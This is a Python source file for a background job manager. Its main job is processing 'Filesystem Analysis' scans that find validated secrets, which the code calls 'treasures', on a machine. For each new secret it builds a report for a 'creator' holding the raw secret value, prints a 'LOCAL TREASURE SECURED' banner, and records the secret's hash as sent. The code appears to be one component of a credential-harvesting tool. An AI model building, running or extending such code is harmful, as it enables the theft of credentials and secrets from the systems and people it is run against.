import json
import logging
import time
import traceback
import uuid
from threading import Thread, RLock
from typing import Dict, Any, List, Callable
import hashlib

from rich.console import Console
from rich.panel import Panel
from rich.syntax import Syntax
from rich.text import Text

class LocalJobManager:
    """
    Manages long-running, non-blocking local tasks (e.g., filesystem scans)
    in background threads.
    """
    def __init__(self, console: Console, love_state: Dict[str, Any], save_state_func: Callable):
        self.console = console
        self.jobs: Dict[str, Dict[str, Any]] = {}
        self.lock = RLock()
        self.active = True
        self.thread = Thread(target=self._job_monitor_loop, daemon=True)
        self.love_state = love_state
        self.save_state = save_state_func

    def start(self):
        self.thread.start()
        logging.info("LocalJobManager started.")

    def stop(self):
        self.active = False
        logging.info("LocalJobManager stopping.")

    def add_job(self, description: str, target_func: Callable, args: tuple = ()) -> str:
        with self.lock:
            job_id = str(uuid.uuid4())[:8]
            job_thread = Thread(target=self._run_job, args=(job_id, target_func, args), daemon=True)
            self.jobs[job_id] = {
                "id": job_id,
                "description": description,
                "status": "pending",
                "result": None,
                "error": None,
                "created_at": time.time(),
                "thread": job_thread,
                "progress": None,
            }
            job_thread.start()
            logging.info(f"Added and started new local job {job_id}: {description}")
            return job_id

    def _update_job_progress(self, job_id: str, completed: int, total: int, description: str):
        with self.lock:
            if job_id in self.jobs:
                self.jobs[job_id]['progress'] = {
                    "completed": completed,
                    "total": total,
                    "description": description,
                }

    def _run_job(self, job_id: str, target_func: Callable, args: tuple):
        try:
            self._update_job_status(job_id, "running")
            progress_callback = lambda completed, total, desc: self._update_job_progress(job_id, completed, total, desc)
            result = target_func(*args, progress_callback=progress_callback)
            with self.lock:
                if job_id in self.jobs:
                    self.jobs[job_id]['result'] = result
                    self.jobs[job_id]['status'] = "completed"
            logging.info(f"Local job {job_id} completed successfully.")
        except Exception as e:
            error_message = f"Error in local job {job_id}: {traceback.format_exc()}"
            logging.error(error_message)
            with self.lock:
                if job_id in self.jobs:
                    self.jobs[job_id]['error'] = str(e)
                    self.jobs[job_id]['status'] = "failed"

    def get_status(self) -> List[Dict[str, Any]]:
        with self.lock:
            status_list = []
            for job in self.jobs.values():
                status_list.append({
                    "id": job["id"],
                    "description": job["description"],
                    "status": job["status"],
                    "created_at": job["created_at"],
                    "progress": job["progress"],
                })
            return status_list

    def _update_job_status(self, job_id: str, status: str):
        with self.lock:
            if job_id in self.jobs:
                self.jobs[job_id]['status'] = status
                logging.info(f"Local job {job_id} status changed to '{status}'.")

    def _job_monitor_loop(self):
        while self.active:
            try:
                with self.lock:
                    completed_jobs = [job for job in self.jobs.values() if job['status'] == 'completed']
                for job in completed_jobs:
                    self._process_completed_job(job)
                self._cleanup_processed_jobs()
            except Exception as e:
                logging.error(f"Error in LocalJobManager loop: {e}")
            time.sleep(15)

    def _process_completed_job(self, job: Dict[str, Any]):
        job_id = job['id']
        description = job['description']
        result = job['result']
        logging.info(f"Processing result for completed job {job_id}: {description}")

        if description.startswith("Filesystem Analysis"):
            path = description.split(" on ")[-1]
            result_data = result if isinstance(result, dict) else {}
            validated_treasures = result_data.get("validated_treasures", [])

            if not validated_treasures:
                self.console.print(f"[cyan]Background filesystem scan for '{path}' complete. No new treasures found.[/cyan]")
            else:
                self.console.print(f"[bold green]Background filesystem scan for '{path}' complete. Found {len(validated_treasures)} potential treasures. Processing now...[/bold green]")
                for treasure in validated_treasures:
                    if treasure.get("validation", {}).get("validated"):
                        treasure_type = treasure.get("type")
                        file_path = treasure.get("file_path")
                        secret_value = treasure.get("raw_value_for_encryption")
                        identifier_string = f"{treasure_type}:{file_path}:{json.dumps(secret_value, sort_keys=True)}"
                        treasure_hash = hashlib.sha256(identifier_string.encode()).hexdigest()

                        if treasure_hash in self.love_state.get('sent_treasures', []):
                            continue

                        logging.critical(f"Validated treasure found: {treasure['type']} in {treasure['file_path']}")
                        report_for_creator = {
                            "treasure_type": treasure.get("type"),
                            "file_path": treasure.get("file_path"),
                            "validation_scope": treasure.get("validation", {}).get("scope"),
                            "recommendations": treasure.get("validation", {}).get("recommendations"),
                            "secret": treasure.get("raw_value_for_encryption")
                        }
                        report_text = Text()
                        report_text.append("Type: ", style="bold")
                        report_text.append(f"{report_for_creator.get('treasure_type', 'N/A')}\n", style="cyan")
                        report_text.append("Source: ", style="bold")
                        report_text.append(f"{report_for_creator.get('file_path', 'N/A')}\n\n", style="white")
                        self.console.print(Panel(report_text, title="[bold magenta]LOCAL TREASURE SECURED[/bold magenta]", border_style="magenta", expand=False))
                        self.love_state.setdefault('sent_treasures', []).append(treasure_hash)
            self.save_state(self.console)

        with self.lock:
            if job_id in self.jobs:
                self.jobs[job_id]['status'] = 'processed'

    def _cleanup_processed_jobs(self):
        with self.lock:
            jobs_to_remove = [job_id for job_id, job in self.jobs.items() if job['status'] in ['processed', 'failed']]
            for job_id in jobs_to_remove:
                del self.jobs[job_id]
                logging.info(f"Cleaned up local job {job_id}.")
